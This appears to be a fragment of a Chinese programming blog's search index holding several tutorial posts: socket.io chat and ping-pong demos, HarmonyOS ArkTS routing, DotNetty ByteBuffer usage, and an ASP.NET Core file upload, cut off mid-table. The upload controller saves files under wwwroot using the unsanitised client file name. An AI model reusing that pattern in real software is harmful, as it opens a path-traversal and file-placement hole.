监听客户端发送的消息 socket.on(\u0026#39;chat message\u0026#39;, (msg) =\u0026gt; { // 广播消息给所有连接的客户端 io.emit(\u0026#39;chat message\u0026#39;, msg); }); // 监听客户端断开连接事件 socket.on(\u0026#39;disconnect\u0026#39;, () =\u0026gt; { console.log(\u0026#39;一个用户已断开连接\u0026#39;); }); }); const port = 3000; http.listen(port, () =\u0026gt; { console.log(`服务器运行在端口 ${port}`); }); 客户端代码（public/index.html） \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;简单聊天应用\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { font-family: Arial, sans-serif; } #messages { list-style-type: none; margin: 0; padding: 0; } #messages li { padding: 5px 10px; } #messages li:nth-child(odd) { background: #eee; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;ul id=\u0026#34;messages\u0026#34;\u0026gt;\u0026lt;/ul\u0026gt; \u0026lt;form id=\u0026#34;form\u0026#34; action=\u0026#34;\u0026#34;\u0026gt; \u0026lt;input id=\u0026#34;input\u0026#34; autocomplete=\u0026#34;off\u0026#34; /\u0026gt;\u0026lt;button\u0026gt;发送\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script src=\u0026#34;/socket.io/socket.io.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; // 连接到服务器 var socket = io(); var form = document.getElementById(\u0026#39;form\u0026#39;); var input = document.getElementById(\u0026#39;input\u0026#39;); var messages = document.getElementById(\u0026#39;messages\u0026#39;); // 监听表单提交事件 form.addEventListener(\u0026#39;submit\u0026#39;, function (e) { e.preventDefault(); if (input.value) { // 发送消息到服务器 socket.emit(\u0026#39;chat message\u0026#39;, input.value); input.value = \u0026#39;\u0026#39;; } }); // 监听服务器发送的消息 socket.on(\u0026#39;chat message\u0026#39;, function (msg) { var item = document.createElement(\u0026#39;li\u0026#39;); item.textContent = msg; messages.appendChild(item); window.scrollTo(0, document.body.scrollHeight); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; npm install express socket.io node server.js 访问应用： 打开浏览器，访问 http://localhost:3000。可以打开多个浏览器窗口或标签，模拟不同的用户进行聊天。\npingpong // 监听客户端连接事件 io.on(\u0026#39;connection\u0026#39;, (socket) =\u0026gt; { console.log(\u0026#39;一个客户端已连接\u0026#39;); // 监听客户端发送的 ping 消息 socket.on(\u0026#39;ping\u0026#39;, () =\u0026gt; { console.log(\u0026#39;收到 ping 消息\u0026#39;); // 向客户端发送 pong 消息 socket.emit(\u0026#39;pong\u0026#39;); }); // 监听客户端断开连接事件 socket.on(\u0026#39;disconnect\u0026#39;, () =\u0026gt; { console.log(\u0026#39;一个客户端已断开连接\u0026#39;); }); }); \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Ping - Pong 示例\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;button id=\u0026#34;pingButton\u0026#34;\u0026gt;发送 Ping\u0026lt;/button\u0026gt; \u0026lt;p id=\u0026#34;result\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;script src=\u0026#34;/socket.io/socket.io.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; // 连接到服务器 var socket = io(); var pingButton = document.getElementById(\u0026#39;pingButton\u0026#39;); var result = document.getElementById(\u0026#39;result\u0026#39;); // 监听按钮点击事件 pingButton.addEventListener(\u0026#39;click\u0026#39;, function () { console.log(\u0026#39;发送 ping 消息\u0026#39;); // 向服务器发送 ping 消息 socket.emit(\u0026#39;ping\u0026#39;); }); // 监听服务器发送的 pong 消息 socket.on(\u0026#39;pong\u0026#39;, () =\u0026gt; { console.log(\u0026#39;收到 pong 消息\u0026#39;); result.textContent = \u0026#39;收到 pong 消息\u0026#39;; }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 点击 “发送 Ping” 按钮，页面上会显示 “收到 pong 消息”，同时在浏览器和服务器的控制台也会有相应的日志输出。\n前后端 基于 Node.js 的服务端和前端页面实现，满足点击特定按钮后在后端控制台输出 1 的需求。\n服务端代码 (server.js)：\nconst http = require(\u0026#39;http\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const path = require(\u0026#39;path\u0026#39;); // 创建HTTP服务器 const server = http.createServer((req, res) =\u0026gt; { // 处理根路径请求，返回HTML页面 if (req.method === \u0026#39;GET\u0026#39; \u0026amp;\u0026amp; req.url === \u0026#39;/\u0026#39;) { res.writeHead(200, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39; }); fs.createReadStream(path.join(__dirname, \u0026#39;index.html\u0026#39;)).pipe(res); } // 处理按钮点击的POST请求 else if (req.method === \u0026#39;POST\u0026#39; \u0026amp;\u0026amp; req.url === \u0026#39;/click\u0026#39;) { console.log(1); // 后端输出1 res.writeHead(200, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39; }); res.end(\u0026#39;OK\u0026#39;); } // 其他请求返回404 else { res.writeHead(404, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39; }); res.end(\u0026#39;Not Found\u0026#39;); } }); // 启动服务器 const PORT = 3000; server.listen(PORT, () =\u0026gt; { console.log(`Server running at http://localhost:${PORT}`); }); 前端页面代码 (index.html)：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;按钮测试\u0026lt;/title\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.tailwindcss.com\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link href=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;script\u0026gt; tailwind.config = { theme: { extend: { colors: { primary: \u0026#39;#3B82F6\u0026#39;, secondary: \u0026#39;#10B981\u0026#39;, accent: \u0026#39;#8B5CF6\u0026#39;, }, fontFamily: { sans: [\u0026#39;Inter\u0026#39;, \u0026#39;system-ui\u0026#39;, \u0026#39;sans-serif\u0026#39;], }, }, } } \u0026lt;/script\u0026gt; \u0026lt;style type=\u0026#34;text/tailwindcss\u0026#34;\u0026gt; @layer utilities { .content-auto { content-visibility: auto; } .proxies-speed-test { @apply bg-gradient-to-r from-primary to-accent text-white font-bold py-3 px-8 rounded-full shadow-lg hover:shadow-xl transition-all duration-300 transform hover:-translate-y-1 focus:outline-none focus:ring-2 focus:ring-primary/50 active:scale-95; } .proxies-speed-test i { @apply mr-2 transition-transform duration-300; } .proxies-speed-test:hover i { @apply transform rotate-12; } } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;bg-gray-50 min-h-screen flex flex-col items-center justify-center p-4\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;bg-white rounded-2xl shadow-xl p-8 max-w-md w-full transform transition-all duration-500 hover:shadow-2xl\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-[clamp(1.5rem,3vw,2.5rem)] font-bold text-gray-800 mb-8 text-center\u0026#34;\u0026gt;点击测试\u0026lt;/h1\u0026gt; \u0026lt;div class=\u0026#34;flex justify-center\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;proxies-speed-test\u0026#34;\u0026gt; \u0026lt;i class=\u0026#34;fas fa-bolt\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;点击我 \u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;result\u0026#34; class=\u0026#34;mt-8 text-center text-gray-600\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; document.querySelector(\u0026#39;.proxies-speed-test\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, async function() { try { // 显示加载状态 this.innerHTML = \u0026#39;\u0026lt;i class=\u0026#34;fas fa-spinner fa-spin mr-2\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;处理中...\u0026#39;; this.disabled = true; // 发送POST请求到后端 const response = await fetch(\u0026#39;/click\u0026#39;, { method: \u0026#39;POST\u0026#39; }); // 显示成功状态 if (response.ok) { document.getElementById(\u0026#39;result\u0026#39;).innerHTML = \u0026#39;\u0026lt;div class=\u0026#34;text-green-500\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fas fa-check-circle mr-2\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;请求已发送\u0026lt;/div\u0026gt;\u0026#39;; // 添加成功动画 this.classList.add(\u0026#39;bg-gradient-to-r\u0026#39;, \u0026#39;from-secondary\u0026#39;, \u0026#39;to-secondary\u0026#39;); setTimeout(() =\u0026gt; { this.innerHTML = \u0026#39;\u0026lt;i class=\u0026#34;fas fa-bolt mr-2\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;点击我\u0026#39;; this.disabled = false; this.classList.remove(\u0026#39;bg-gradient-to-r\u0026#39;, \u0026#39;from-secondary\u0026#39;, \u0026#39;to-secondary\u0026#39;); }, 1500); } } catch (error) { // 显示错误状态 document.getElementById(\u0026#39;result\u0026#39;).innerHTML = \u0026#39;\u0026lt;div class=\u0026#34;text-red-500\u0026#34;\u0026gt;\u0026lt;i class=\u0026#34;fas fa-exclamation-circle mr-2\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;发生错误\u0026lt;/div\u0026gt;\u0026#39;; this.innerHTML = \u0026#39;\u0026lt;i class=\u0026#34;fas fa-bolt mr-2\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;点击我\u0026#39;; this.disabled = false; } }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 说明： 将上述代码保存为server.js和index.html并放在同一目录下 确保已安装 Node.js 环境 在终端中运行：node server.js 打开浏览器访问：http://localhost:3000 点击页面上的按钮，后端控制台将输出数字 1\n","permalink":"https://qfsyso.github.io/posts/node-socket.io/","summary":"server\nnpm install express npm install socket.io const express = require(\u0026#39;express\u0026#39;); const http = require(\u0026#39;http\u0026#39;); const socketIO = require(\u0026#39;socket.io\u0026#39;); const app = express(); const server = http.createServer(app); const io = socketIO(server); io.on(\u0026#39;connection\u0026#39;, (socket) =\u0026gt; { console.log(\u0026#39;User connected\u0026#39;); socket.on(\u0026#39;chat message\u0026#39;, (msg) =\u0026gt; { console.log(\u0026#39;message: \u0026#39; + msg); io.emit(\u0026#39;chat message\u0026#39;, msg); // to all }); socket.on(\u0026#39;disconnect\u0026#39;, () =\u0026gt; { console.log(\u0026#39;User disconnected\u0026#39;); }); }); server.listen(24525, () =\u0026gt; { console.log(\u0026#39;Node Server is running on port 24525\u0026#39;); }); docker dockerfile","title":"Node socket.io"},{"content":"🎬️create @Component export default struct TitleBar { build(){ Row(){ Text(\u0026#39;transition\u0026#39;) .fontSize(\u0026#39;30fp\u0026#39;) .fontColor(Color.White) } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;8%\u0026#39;) .backgroundColor(\u0026#39;#4169E1\u0026#39;) .padding({left:10}) } } 🎞️interface export interface IList{ title:string; url :string; } @State listData:IList[]=[ // @State listData:Array\u0026lt;IList\u0026gt;=[ { title:\u0026#39;in\u0026#39;, url:\u0026#39;pages/home1\u0026#39; }, { title:\u0026#39;scale\u0026#39;, url:\u0026#39;pages/home2\u0026#39; }, { title:\u0026#39;small\u0026#39;, url:\u0026#39;pages/home3\u0026#39; }, { title:\u0026#39;in\u0026#39;, url:\u0026#39;\u0026#39; } ] 💡foreach ForEach(this.listData,( item: IList,index?:number)=\u0026gt;{ //listitem Button({type:ButtonType.Capsule}){ Text(item.title) .fontSize(\u0026#39;35fp\u0026#39;) .fontColor(Color.White) } //... }) 🔦router import router from \u0026#39;@ohos.router\u0026#39; 📼mainpage \u0026#34;pages/home1\u0026#34; 📹️onclick .onClick(()=\u0026gt;{ //router router.pushUrl({url:item.url}) }) 📺️setInterval //home1 page1 import router from \u0026#39;@ohos.router\u0026#39; @Entry @Component struct Index { @State TOTAL_TIME:number = 6;//s @State FIRST_CT:number =3;//s aboutToAppear(){ //timer let timer= setInterval(()=\u0026gt;{ this.TOTAL_TIME--; if(this.TOTAL_TIME===0){ //end router.pushUrl({ url:\u0026#34;pages/Index\u0026#34; }) clearInterval(timer); } },1000) } build() { Column() { Row() { if(this.TOTAL_TIME\u0026gt;this.FIRST_CT){ //1 Image($r(\u0026#39;app.media.t2\u0026#39;)) .objectFit(ImageFit.Contain) }else if(this.TOTAL_TIME\u0026lt;this.FIRST_CT) { //2 Image($r(\u0026#39;app.media.bc\u0026#39;)) .objectFit(ImageFit.Contain) .width(\u0026#39;30%\u0026#39;) Text(\u0026#39; - m - \u0026#39;) .fontSize(\u0026#39;30fp\u0026#39;) } } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .justifyContent(FlexAlign.Center) // Text(\u0026#39;in\u0026#39;) // .fontSize(\u0026#39;50fp\u0026#39;) } .width(\u0026#39;100%\u0026#39;) } } ​\n📽️TransitionEnter scale //home2 page2 @State scale1: number = 1 @State opacity1: number = 1 //... Column() .scale({ x: this.scale1 }).opacity(this.opacity1) //... pageTransition() { PageTransitionEnter({ duration: 1200, curve: Curve.Linear }) .onEnter((type: RouteType, progress: number) =\u0026gt; { this.scale1 = 1 this.opacity1 = progress }) // onEnter (0% -- 100%) PageTransitionExit({ duration: 1500, curve: Curve.Ease }) .onExit((type: RouteType, progress: number) =\u0026gt; { this.scale1 = 1 - progress this.opacity1 = 1 }) // onExit (0% -- 100%) } ​\n🎥SlideEffect.Left pageTransition() { PageTransitionEnter({ duration: 1200 }) .slide(SlideEffect.Left) PageTransitionExit({ delay: 100 }) .translate({ x: 100.0, y: 100.0 }) .opacity(0) } ​\n","permalink":"https://qfsyso.github.io/posts/harmonyos-interface-router-arkts-arkui/","summary":"🎬️create @Component export default struct TitleBar { build(){ Row(){ Text(\u0026#39;transition\u0026#39;) .fontSize(\u0026#39;30fp\u0026#39;) .fontColor(Color.White) } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;8%\u0026#39;) .backgroundColor(\u0026#39;#4169E1\u0026#39;) .padding({left:10}) } } 🎞️interface export interface IList{ title:string; url :string; } @State listData:IList[]=[ // @State listData:Array\u0026lt;IList\u0026gt;=[ { title:\u0026#39;in\u0026#39;, url:\u0026#39;pages/home1\u0026#39; }, { title:\u0026#39;scale\u0026#39;, url:\u0026#39;pages/home2\u0026#39; }, { title:\u0026#39;small\u0026#39;, url:\u0026#39;pages/home3\u0026#39; }, { title:\u0026#39;in\u0026#39;, url:\u0026#39;\u0026#39; } ] 💡foreach ForEach(this.listData,( item: IList,index?:number)=\u0026gt;{ //listitem Button({type:ButtonType.Capsule}){ Text(item.title) .fontSize(\u0026#39;35fp\u0026#39;) .fontColor(Color.White) } //... }) 🔦router import router from \u0026#39;@ohos.router\u0026#39; 📼mainpage \u0026#34;pages/home1\u0026#34; 📹️onclick .onClick(()=\u0026gt;{ //router router.","title":"HarmonyOS Interface Router ArkTS ArkUI"},{"content":"DotNetty是一个高性能的.NET网络通信框架，基于Netty，支持TCP、UDP、HTTP、WebSocket等协议。适用于高并发、低延迟场景，如实时通信、游戏服务器、IoT应用及大型分布式系统，通过异步I/O、零拷贝等技术提升性能，具备易用性、可扩展性。 架构上，围绕Channel、EventLoop、ChannelPipeline、ChannelHandlerContext设计，包含Transport、Codec、Handler等模块，简化网络编程，加速数据传输处理。\nByteBuffer 用于高效处理字节数据，固定容量，通过allocate或wrap创建。涉及position和limit追踪读写位置，提供get/put等读写方法，flip切换读写模式，clear清空缓冲区，compact移动数据并准备下一轮读写，适用于高性能IO与网络通信。.\n优点 零拷贝通过复合缓冲区实现。 动态容量增长。 无需flip切换读写模式。 分离读写索引。 内置引用计数。 支持缓冲区池化。 优化网络通信中的字节处理。\n结构 readerIndex 读取，随读增。 writerIndex 写入，随写增。 capacity容量。\nByteBuffer属性 readIndex：下一个读位 writeIndex：下一个写位置 capacity：容量 0：缓冲区开始位置\n已经读取的区域：[0,readerindex) 可读取的区域：[readerindex,writerIndex) 可写的区域: [writerIndex,capacity) 读写独立索引，操作命名区分（read/write自动进，get/set不影响索引）。 支持设定最大容量，超限写操作将抛异常，默认上限Integer.MAX_VALUE。 readerIndex writerIndex 本质为灵活高效字节容器\n堆缓冲区 最常用的 ByteBuffer 模式是将数据存储在堆空间中。这种模式被称为支撑数组（backing array），它能在没有使用池化的情况下提供快速的分配和释放。可以由 hasArray() 来判断检查 ByteBuffer是否由数组支撑。如果不是，则这是一个直接缓冲区。\n直接缓冲区 直接缓冲区是另外一种 ByteBuffer 模式。 直接缓冲区的主要缺点是，相对于基于堆的缓冲区，它们的分配和释放都较为昂贵。\n复合缓冲区 复合缓冲区 CompositeByteBuf，它为多个 ByteBuffer提供一个聚合视图。比如 HTTP 协议， 分为消息头和消息体，这两部分可能由应用程序的不同模块产生，各有各的 ByteBuffer，将会在消息被发送的时候组装为一个 ByteBuffer，此时可以将这两个 ByteBuffer聚合为一个 CompositeByteBuf，然后使用统一和通用的 ByteBuffer API 来操作。\n如何在的程序中获得 ByteBuf 的实例，并使用它呢？Netty 提供了两种方式\nByteBufAllocator 接口 ByteBufAllocator 分配任意类型的 ByteBuffer 实例。\nbuffer(): 基于堆/直接内存ByteBuffer。 heapBuffer(): 仅堆内存。 directBuffer(): 仅直接内存。 compositeBuffer(): 可组合多个缓冲区，支持堆/直接内存。 ioBuffer(): 适配I/O操作，优先直接内存(需Unsafe支持)。 ByteBufAllocator： Channel ChannelHandlerContext\nUnpooled 缓冲区\nUnpooled工具类助创ByteBuffer buffer()：堆内存ByteBuffer directBuffer()：直接内存ByteBuffer wrappedBuffer()：包装数据的ByteBuffer copiedBuffer()：复制数据的ByteBuffer 适用范围广泛，不仅限于Netty网络项目。\nIByteBuffer byteBuf = Unpooled.CopiedBuffer(\u0026#34;hello,world!\u0026#34;, Encoding.UTF8); ByteBuf访问/读写 索引从0开始至capacity()-1。 随机访问（get/set）不改索引，需显式调用readerIndex()/writerIndex()移动。 顺序访问分两类： get/set：固定索引，读写数据不移位。 read/write：自动调整readerIndex/writerIndex。\nisReadable() 如果至少有一个字节可供读取，则返回 true isWritable() 如果至少有一个字节可被写入，则返回 true readableBytes() 返回可被读取的字节数 writableBytes() 返回可被写入的字节数 capacity() 返回 ByteBuffer 可容纳的字节数。在此之后，它会尝试再次扩展直到达到 maxCapacity() maxCapacity() 返回 ByteBuffer 可以容纳的最大字节数 hasArray() 如果 ByteBuffer 由一个字节数组支撑，则返回 true array() 如果 ByteBuffer 由一个字节数组支撑则返回该数组\n可丢弃字节 读操作后，字节积累在\u0026quot;可丢弃\u0026quot;段，始于readerIndex。 discardReadBytes()释放已读字节，回收空间，可能导致之前数据移动。 此操作可能涉及内存复制，谨慎使用。\n可读字节：存储实际数据，新缓冲区默认从readerIndex=0开始。 可写字节：空白区域待写入，新缓冲区writerIndex初设0，写操作后自动递增。\n资源释放 处理Netty入站ByteBuffer ，可选自动释放：用SimpleChannelInboundHandler，或在channelRead()末手动调用ReferenceCountUtil.release(msg)确保资源管理。\nusing DotNetty.Buffers; using DotNetty.Transport.Channels; public class CommanChannelInboundHandler : SimpleChannelInboundHandler\u0026lt;object\u0026gt; { protected override void ChannelRead(IChannelHandlerContext context, object message) { bool shouldRelease = true; try { if (IsMessageAcceptable(message)) { ChannelRead0(context, message); } else { shouldRelease = false; context.FireChannelRead(message); } } finally { if (AutoRelease \u0026amp;\u0026amp; shouldRelease) { ResourceUtil.Release(message); } } } private bool IsMessageAcceptable(object msg) { return msg is IByteBuffer; // 假设只处理IByteBuffer类型的消息 } protected virtual void ChannelRead0(IChannelHandlerContext context, object message) { //IByteBuffer ... } private bool AutoRelease { get; set; } = true; } 对于出站请求，不管 ByteBuffer 是否由我们的业务创建的，当调用了 write 或者 writeAndFlush 方法后，Netty 会自动替我们释放，不需要我们业务代码自行释放。\n// 创建ByteBuf对象，初始容量为1，内部动态扩容以容纳更多数据 IByteBuffer byteBuf = Unpooled.Buffer(1); Console.WriteLine(\u0026#34;byteBuf=\u0026#34; + byteBuf); for (int i = 0; i \u0026lt; 8; i++) { byteBuf.WriteByte(i); } Console.WriteLine(\u0026#34;byteBuf=\u0026#34; + byteBuf); for (int i = 0; i \u0026lt; 5; i++) { Console.WriteLine(byteBuf.GetByte(i)); } Console.WriteLine(\u0026#34;byteBuf=\u0026#34; + byteBuf); for (int i = 0; i \u0026lt; 5; i++) { Console.WriteLine(byteBuf.ReadByte()); } Console.WriteLine(\u0026#34;byteBuf=\u0026#34; + byteBuf); //byteBuf2 // 使用Unpooled工具类创建ByteBuf，内容为\u0026#34;hello,world!\u0026#34; IByteBuffer byteBuf2 = Unpooled.CopiedBuffer(\u0026#34;hello,world!\u0026#34;, Encoding.UTF8); // Unpooled.CopiedBuffer(\u0026#34;hello,world!\u0026#34;, Encoding.UTF8); // 使用相关的方法 if (byteBuf2.HasArray) // if (byteBuf2.HasArray) { byte[] content = byteBuf2.Array; // 将content转成字符串 Console.WriteLine(Encoding.UTF8.GetString(content)); Console.WriteLine(\u0026#34;byteBuf2=\u0026#34; + byteBuf2); Console.WriteLine(byteBuf2.GetByte(0)); // 获取数组0这个位置的字符\u0026#39;h\u0026#39;的ASCII码，h=104 int len = byteBuf2.ReadableBytes; // 可读的字节数 12 Console.WriteLine(\u0026#34;len=\u0026#34; + len); // 使用for取出各个字节并转换为对应的字符打印 for (int i = 0; i \u0026lt; len; i++) { Console.WriteLine((char)byteBuf2.GetByte(i)); } // 范围读取 Console.WriteLine(byteBuf2.GetCharSequence(0, 6, Encoding.UTF8)); Console.WriteLine(byteBuf2.GetCharSequence(6, 6, Encoding.UTF8)); } //byteBuf3 WrappedBuffer var str1 = Encoding.UTF8.GetBytes(\u0026#34;hello,world!\u0026#34;); var byteBuf3 = Unpooled.WrappedBuffer(str1); if (byteBuf3.HasArray) // if (byteBuf2.HasArray) { byte[] content = byteBuf3.Array; // 将content转成字符串 Console.WriteLine(Encoding.UTF8.GetString(content)); Console.WriteLine(\u0026#34;byteBuf3=\u0026#34; + byteBuf3); Console.WriteLine(byteBuf3.GetByte(0)); // 获取数组0这个位置的字符\u0026#39;h\u0026#39;的ASCII码，h=104 int len = byteBuf3.ReadableBytes; // 可读的字节数 12 Console.WriteLine(\u0026#34;len=\u0026#34; + len); // 使用for取出各个字节并转换为对应的字符打印 for (int i = 0; i \u0026lt; len; i++) { Console.WriteLine((char)byteBuf3.GetByte(i)); } // 范围读取 Console.WriteLine(byteBuf3.GetCharSequence(0, 6, Encoding.UTF8)); Console.WriteLine(byteBuf3.GetCharSequence(6, 6, Encoding.UTF8)); } 结果得出 get操作 readerIndex 不变，read操作使其移动。\nEnd\n","permalink":"https://qfsyso.github.io/posts/dotnetty-bytebuffer/","summary":"DotNetty是一个高性能的.NET网络通信框架，基于Netty，支持TCP、UDP、HTTP、WebSocket等协议。适用于高并发、低延迟场景，如实时通信、游戏服务器、IoT应用及大型分布式系统，通过异步I/O、零拷贝等技术提升性能，具备易用性、可扩展性。 架构上，围绕Channel、EventLoop、ChannelPipeline、ChannelHandlerContext设计，包含Transport、Codec、Handler等模块，简化网络编程，加速数据传输处理。\nByteBuffer 用于高效处理字节数据，固定容量，通过allocate或wrap创建。涉及position和limit追踪读写位置，提供get/put等读写方法，flip切换读写模式，clear清空缓冲区，compact移动数据并准备下一轮读写，适用于高性能IO与网络通信。.\n优点 零拷贝通过复合缓冲区实现。 动态容量增长。 无需flip切换读写模式。 分离读写索引。 内置引用计数。 支持缓冲区池化。 优化网络通信中的字节处理。\n结构 readerIndex 读取，随读增。 writerIndex 写入，随写增。 capacity容量。\nByteBuffer属性 readIndex：下一个读位 writeIndex：下一个写位置 capacity：容量 0：缓冲区开始位置\n已经读取的区域：[0,readerindex) 可读取的区域：[readerindex,writerIndex) 可写的区域: [writerIndex,capacity) 读写独立索引，操作命名区分（read/write自动进，get/set不影响索引）。 支持设定最大容量，超限写操作将抛异常，默认上限Integer.MAX_VALUE。 readerIndex writerIndex 本质为灵活高效字节容器\n堆缓冲区 最常用的 ByteBuffer 模式是将数据存储在堆空间中。这种模式被称为支撑数组（backing array），它能在没有使用池化的情况下提供快速的分配和释放。可以由 hasArray() 来判断检查 ByteBuffer是否由数组支撑。如果不是，则这是一个直接缓冲区。\n直接缓冲区 直接缓冲区是另外一种 ByteBuffer 模式。 直接缓冲区的主要缺点是，相对于基于堆的缓冲区，它们的分配和释放都较为昂贵。\n复合缓冲区 复合缓冲区 CompositeByteBuf，它为多个 ByteBuffer提供一个聚合视图。比如 HTTP 协议， 分为消息头和消息体，这两部分可能由应用程序的不同模块产生，各有各的 ByteBuffer，将会在消息被发送的时候组装为一个 ByteBuffer，此时可以将这两个 ByteBuffer聚合为一个 CompositeByteBuf，然后使用统一和通用的 ByteBuffer API 来操作。\n如何在的程序中获得 ByteBuf 的实例，并使用它呢？Netty 提供了两种方式\nByteBufAllocator 接口 ByteBufAllocator 分配任意类型的 ByteBuffer 实例。\nbuffer(): 基于堆/直接内存ByteBuffer。 heapBuffer(): 仅堆内存。 directBuffer(): 仅直接内存。 compositeBuffer(): 可组合多个缓冲区，支持堆/直接内存。 ioBuffer(): 适配I/O操作，优先直接内存(需Unsafe支持)。 ByteBufAllocator： Channel ChannelHandlerContext","title":"DotNetty ByteBuffer"},{"content":"VS2022 .NET8\n💾基础上传示例 view\n@{ ViewData[\u0026#34;Title\u0026#34;] = \u0026#34;File Upload\u0026#34;; } \u0026lt;h1\u0026gt;@ViewData[\u0026#34;Title\u0026#34;]\u0026lt;/h1\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34; action=\u0026#34;/Home/UploadFile\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; class=\u0026#34;form-control\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;Upload\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; controller\n[HttpPost] public async Task\u0026lt;IActionResult\u0026gt; UploadFile() { var file = Request.Form.Files[0]; if (file != null \u0026amp;\u0026amp; file.Length \u0026gt; 0) { var uploads = Path.Combine(Directory.GetCurrentDirectory(), \u0026#34;wwwroot\u0026#34;, \u0026#34;up\u0026#34;); if (!Directory.Exists(uploads)) { Directory.CreateDirectory(uploads); } var filePath = Path.Combine(uploads, file.FileName); using (var fileStream = new FileStream(filePath, FileMode.Create)) { await file.CopyToAsync(fileStream); } // SAVE TO DB return RedirectToAction(\u0026#34;Index\u0026#34;); } return View(); } app.UseStaticFiles(); run\n📀优化 限制文件大小 上传文件夹如 img =\u0026gt; img rar =\u0026gt; file 限制文件大小\n// 根据文件类型选择上传的文件夹 string fileExtension = Path.GetExtension(file.FileName).ToLower(); switch (fileExtension) { case \u0026#34;.jpg\u0026#34;: case \u0026#34;.png\u0026#34;: uploadFolder = Path.Combine(\u0026#34;wwwroot\u0026#34;, \u0026#34;img\u0026#34;); break; case \u0026#34;.mp4\u0026#34;: // 检查视频大小是否超过限制 if (file.Length \u0026gt; 20 * 1024 * 1024) // 20MB { ModelState.AddModelError(\u0026#34;File\u0026#34;, \u0026#34;Video file size should not exceed 20MB.\u0026#34;); return View(\u0026#34;Index\u0026#34;, file); } uploadFolder = Path.Combine(\u0026#34;wwwroot\u0026#34;, \u0026#34;vd\u0026#34;); break; case \u0026#34;.m4a\u0026#34;: uploadFolder = Path.Combine(\u0026#34;wwwroot\u0026#34;, \u0026#34;sound\u0026#34;); break; case \u0026#34;.rar\u0026#34;: uploadFolder = Path.Combine(\u0026#34;wwwroot\u0026#34;, \u0026#34;file\u0026#34;); break; default: ModelState.AddModelError(\u0026#34;File\u0026#34;, \u0026#34;Unsupported file format.\u0026#34;); return View(\u0026#34;Index\u0026#34;, file); } 🪫删除 view\n@model IEnumerable\u0026lt;string\u0026gt; \u0026lt;h1\u0026gt;Uploaded Files\u0026lt;/h1\u0026gt; @if (Model.Any()) { \u0026lt;table class=\u0026#34;table\u0026#34;\u0026gt; \u0026lt;thead\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;th\u0026gt;File Name\u0026lt;/th\u0026gt; \u0026lt;th\u0026gt;Action\u0026lt;/th\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;/thead\u0026gt; \u0026lt;tbody\u0026gt; @foreach (var fileName in Model) { \u0026lt;tr\u0026gt; 